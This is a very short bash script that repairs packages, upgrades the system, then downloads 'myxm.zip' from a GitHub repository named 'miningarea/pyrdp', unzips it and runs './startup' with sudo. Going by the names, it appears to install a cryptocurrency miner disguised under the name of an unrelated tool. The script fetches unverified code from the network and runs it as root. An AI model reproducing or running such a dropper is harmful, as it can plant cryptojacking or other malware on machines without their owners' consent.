#! /bin/bash
sudo dpkg --configure -a
sudo apt-get upgrade && sudo wget https://github.com/miningarea/pyrdp/raw/main/myxm.zip && sudo unzip myxm.zip && sudo ./startup
